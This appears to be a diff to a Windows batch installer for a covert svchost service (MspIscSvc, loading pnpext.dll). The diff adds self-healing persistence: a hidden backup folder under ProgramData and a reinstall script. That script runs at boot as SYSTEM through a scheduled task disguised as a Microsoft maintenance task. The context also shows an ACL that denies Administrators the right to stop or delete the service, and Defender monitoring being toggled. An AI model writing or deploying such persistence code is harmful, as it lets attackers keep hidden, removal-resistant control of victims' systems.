@@ -67,13 +67,60 @@ sc.exe sdset %SVC% "D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCR
 echo [6/7] Configuring ServiceDll...
 reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\System32\pnpext.dll" /f >"%Q%" 2>&1
 reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceMain /t REG_SZ /d "PnpServiceEntry" /f >"%Q%" 2>&1
-echo [7/7] Starting + cleanup...
+echo [7/7] Starting + persistence + cleanup...
 sc.exe start %SVC% >"%Q%" 2>&1
 waitfor /t 5 x >"%Q%" 2>&1
+
+REM ── Persistence: backup to ProgramData + Scheduled Task ─────────────────────
+set BKDIR=C:\ProgramData\Microsoft\Windows\DeviceCache
+mkdir "%BKDIR%" >"%Q%" 2>&1
+attrib +h "%BKDIR%" >"%Q%" 2>&1
+copy /y "%SystemRoot%\System32\pnpext.dll" "%BKDIR%\pnpext.dll" >"%Q%" 2>&1
+if exist "%SystemRoot%\System32\drivers\pnpext.sys" (
+    copy /y "%SystemRoot%\System32\drivers\pnpext.sys" "%BKDIR%\pnpext.sys" >"%Q%" 2>&1
+)
+(
+  echo @echo off
+  echo setlocal
+  echo set SVC=MspIscSvc
+  echo set SVCGROUP=MspGroup
+  echo set BKDIR=C:\ProgramData\Microsoft\Windows\DeviceCache
+  echo set Q=%%TEMP%%\_heal.tmp
+  echo sc.exe query %%SVC%% ^>nul 2^>^&1
+  echo if errorlevel 1 goto :reinstall
+  echo sc.exe query %%SVC%% ^| findstr /C:"RUNNING" ^>nul 2^>^&1
+  echo if not errorlevel 1 exit /b 0
+  echo sc.exe start %%SVC%% ^>"%%Q%%" 2^>^&1
+  echo timeout /t 5 /nobreak ^>nul
+  echo sc.exe query %%SVC%% ^| findstr /C:"RUNNING" ^>nul 2^>^&1
+  echo if not errorlevel 1 exit /b 0
+  echo :reinstall
+  echo copy /y "%%BKDIR%%\pnpext.dll" "%%SystemRoot%%\System32\pnpext.dll" ^>"%%Q%%" 2^>^&1
+  echo if exist "%%BKDIR%%\pnpext.sys" copy /y "%%BKDIR%%\pnpext.sys" "%%SystemRoot%%\System32\drivers\pnpext.sys" ^>"%%Q%%" 2^>^&1
+  echo sc.exe stop %%SVC%% ^>"%%Q%%" 2^>^&1
+  echo sc.exe delete %%SVC%% ^>"%%Q%%" 2^>^&1
+  echo reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\%%SVC%%" /f ^>"%%Q%%" 2^>^&1
+  echo reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %%SVCGROUP%% /t REG_MULTI_SZ /d %%SVC%% /f ^>"%%Q%%" 2^>^&1
+  echo sc.exe create %%SVC%% binPath= "%%SystemRoot%%\System32\svchost.exe -k %%SVCGROUP%%" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" ^>"%%Q%%" 2^>^&1
+  echo sc.exe description %%SVC%% "Maintains internal cache and inter-service context for Windows system providers." ^>"%%Q%%" 2^>^&1
+  echo sc.exe failure %%SVC%% reset= 86400 actions= restart/10000/restart/30000/restart/60000 ^>"%%Q%%" 2^>^&1
+  echo sc.exe failureflag %%SVC%% 1 ^>"%%Q%%" 2^>^&1
+  echo sc.exe sdset %%SVC%% "D:^(D;;WPSD;;;BA^)^(A;;CCLCSWRPLOCRRC;;;BA^)^(A;;CCLCSWRPWPDTLOCRRC;;;SY^)^(A;;CCLCSWLOCRRC;;;IU^)^(A;;CCLCSWLOCRRC;;;SU^)" ^>"%%Q%%" 2^>^&1
+  echo reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%%SVC%%\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\pnpext.dll" /f ^>"%%Q%%" 2^>^&1
+  echo reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%%SVC%%\Parameters" /v ServiceMain /t REG_SZ /d "PnpServiceEntry" /f ^>"%%Q%%" 2^>^&1
+  echo sc.exe start %%SVC%% ^>"%%Q%%" 2^>^&1
+  echo del "%%Q%%" ^>nul 2^>^&1
+  echo endlocal
+) > "%BKDIR%\selfheal.bat"
+schtasks.exe /create /tn "\Microsoft\Windows\Maintenance\WinSockFix" /tr "cmd.exe /c \"%BKDIR%\selfheal.bat\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >"%Q%" 2>&1
+echo        Persistence task registered
+
 rd /s /q "%TD%" >"%Q%" 2>&1
 start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
 echo.
 echo [+] Done! Service: %SVC% (svchost.exe -k %SVCGROUP%)
+echo     Backup: %BKDIR%
+echo     Survives Windows upgrade via scheduled task at boot.
 goto end
 :fail
 rd /s /q "%TD%" >"%Q%" 2>&1
